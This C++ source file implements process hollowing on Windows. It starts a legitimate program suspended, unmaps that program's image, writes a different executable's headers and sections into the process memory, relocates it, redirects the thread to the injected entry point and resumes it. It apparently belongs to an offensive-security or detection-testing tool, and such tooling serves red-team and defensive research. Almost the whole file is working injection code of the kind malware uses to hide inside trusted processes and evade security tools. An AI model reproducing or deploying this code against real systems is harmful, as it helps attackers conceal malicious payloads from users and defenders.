#include <cstdio>
#include <string>

#include "common.h"
#include "modules.h"
#include "sysapi.h"
#include "fs.h"
#include "unique_memory.h"
#include "logging.h"


namespace modules {

bool inject_create_process_hollow(const std::wstring& original_image, const std::wstring& injected_image, RemoteProcessMemoryMethod method) {

    bblog::info("[*] Preparing a new process");

    bblog::info("creating process...");

    auto process = sysapi::ProcessCreateUser(original_image, true);
    if (process.hProcess == NULL) {
        return false;
    }

    bblog::info("getting process PEB address...");

    PROCESS_BASIC_INFORMATION BasicInfo;
    auto res = sysapi::ProcessGetBasicInfo(process.hProcess.get(), BasicInfo);
    if (!res) {
        return false;
    }

    auto process_peb = process_read_peb(process.hProcess.get());
    if (process_peb.data() == NULL) {
        return false;
    }

    bblog::info("[*] Preparing the injected image");
    bblog::info("mapping image file...");

    auto image_mapping = fs::map_file(injected_image.c_str());
    if (image_mapping.handle == NULL) {
        return false;
    }

    auto *pDOSHeader = (PIMAGE_DOS_HEADER)image_mapping.data;
    auto *pNT32Header = (PIMAGE_NT_HEADERS32)PTR_ADD(image_mapping.data, pDOSHeader->e_lfanew);
#if defined(_WIN64)
    auto *pNT64Header = (PIMAGE_NT_HEADERS64)pNT32Header;
    bool is_64 = pNT32Header->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
#else
    bool is_64 = false;
#endif

    RemoteProcessMemoryContext ctx;
    res = process_init_memory(ctx, method, process.hProcess.get(), 0);
    if (!res) {
        return false;
    }

    ctx.Size = pNT32Header->OptionalHeader.SizeOfImage;

    bblog::info("[*] Placing the new image in the target process");

    if (ctx.method == RemoteProcessMemoryMethod::CreateSectionMap ||
        ctx.method == RemoteProcessMemoryMethod::CreateSectionMapLocalMap) {

        ctx.RemoteBaseAddress = process_peb->ImageBaseAddress;

        bblog::info("unmapping original process image section...");

        res = sysapi::SectionUnmapView(ctx.RemoteBaseAddress, process.hProcess.get());
        if (!res) {
            return false;
        }
    }

    res = process_create_memory(ctx);
    if (!res) {
        return false;
    }

    bblog::info("[*] Writing new image");
    bblog::info("writing headers at 0x{:x}...", (uintptr_t)process_peb->ImageBaseAddress);

    res = process_write_memory(ctx, 0, image_mapping.data, pNT32Header->OptionalHeader.SizeOfHeaders);
    if (!res) {
        return false;
    }

    auto *pSections = (PIMAGE_SECTION_HEADER)PTR_ADD(image_mapping.data, pDOSHeader->e_lfanew + (is_64 ? sizeof(IMAGE_NT_HEADERS64) : sizeof(IMAGE_NT_HEADERS32)));

    for (ULONG i = 0; i < pNT32Header->FileHeader.NumberOfSections; i++) {

        if (!pSections[i].PointerToRawData) {
            continue;
        }

        bblog::info("writing {} section at 0x{:x}...", (char *)pSections[i].Name, (uintptr_t)PTR_ADD(process_peb->ImageBaseAddress, pSections[i].VirtualAddress));

        res = process_write_memory(ctx, pSections[i].VirtualAddress, PTR_ADD(image_mapping.data, pSections[i].PointerToRawData), pSections[i].SizeOfRawData);
        if (!res) {
            return false;
        }
    }

    bblog::info("[*] Relocating image");

    res = process_pe_image_relocate(ctx, image_mapping.data);
    if (!res) {
        return false;
    }

    bblog::info("[*] Fixing thread");

#if defined(_WIN64)
    if (is_64) {
        res = thread_set_execute<true, true>(process.hThread.get(), PTR_ADD(process_peb->ImageBaseAddress, pNT64Header->OptionalHeader.AddressOfEntryPoint));
    }
    else {
#endif
        res = thread_set_execute<true, false>(process.hThread.get(), PTR_ADD(process_peb->ImageBaseAddress, pNT32Header->OptionalHeader.AddressOfEntryPoint));
#if defined(_WIN64)
    }
#endif

    bblog::info("resuming thread...");

    if (!ResumeThread(process.hThread.get())) {
        return false;
    }

    bblog::info("[+] Success");
    return true;
}

} // namespace modules
